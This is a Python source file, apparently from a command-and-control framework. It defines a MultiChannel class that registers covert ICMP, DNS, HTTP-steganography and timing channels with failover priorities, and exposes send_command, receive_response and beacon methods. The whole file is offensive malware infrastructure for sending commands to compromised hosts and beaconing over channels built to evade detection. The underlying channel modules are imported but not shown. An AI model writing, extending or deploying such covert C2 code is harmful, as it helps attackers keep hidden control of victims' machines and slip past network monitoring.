from core.channels import BaseChannel, ChannelManager
import random

class MultiChannel(BaseChannel):
    def __init__(self, config: dict):
        super().__init__(config)
        self.manager = ChannelManager()
        self.setup_priorities()
        
    def setup_priorities(self):
        from .icmp_advanced import AdvancedICMPChannel
        from .dns_covert import DNSCovertChannel
        from .http_stego import HTTPStegoChannel
        from .timing_advanced import TimingAdvancedChannel
        
        self.manager.register_channel('icmp', AdvancedICMPChannel, priority=1)
        self.manager.register_channel('dns', DNSCovertChannel, priority=2)
        self.manager.register_channel('http', HTTPStegoChannel, priority=3)
        self.manager.register_channel('timing', TimingAdvancedChannel, priority=4)
    
    def init(self) -> bool:
        self.active = self.manager.get_available_channel()
        return self.active is not None
    
    def is_available(self) -> bool:
        if not self.active or not self.active.is_available():
            self.active = self.manager.get_available_channel()
        return self.active is not None
    
    def send_command(self, command_data: dict, task_id: str) -> bool:
        return self.active.send_command(command_data, task_id)
    
    def receive_response(self, task_id: str) -> dict:
        return self.active.receive_response(task_id)
    
    def beacon(self) -> bool:
        return self.active.beacon()
    
    def teardown(self):
        if self.active:
            self.active.teardown()
